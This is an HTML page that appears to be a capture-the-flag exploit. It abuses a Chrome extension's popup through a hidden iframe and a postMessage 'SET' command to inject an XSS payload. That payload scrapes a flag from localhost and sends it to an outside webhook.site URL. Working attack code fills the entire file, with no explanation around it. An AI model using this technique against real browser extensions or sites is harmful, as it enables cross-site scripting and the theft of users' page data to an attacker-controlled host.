<!DOCTYPE html>
<html>
<body>
    <marquee>test</marquee>
    <script>
        setTimeout(() => {
            const img = document.querySelector('img[alt="STOP"]');
            if (img) {
                const extId = img.src.split('/')[2];
                const iframe = document.createElement('iframe');
                iframe.src = `chrome-extension://${extId}/popup.html`;
                iframe.style.display = 'none';
                iframe.onload = () => {
                    // Payload that fetches the flag
                    const payload = `<img src=x onerror="fetch('http://localhost:1337').then(r=>r.text()).then(t=>{const m=t.match(/<marquee>([^<]+)<\\/marquee>/);if(m)fetch('https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a?flag='+m[1])})">`;
                    iframe.contentWindow.postMessage({
                        type: "SET",
                        replacementString: payload
                    }, "*");
                    setTimeout(() => location.href = 'http://localhost:1337', 1000);
                };
                document.body.appendChild(iframe);
            }
        }, 2000);
    </script>
</body>
</html>
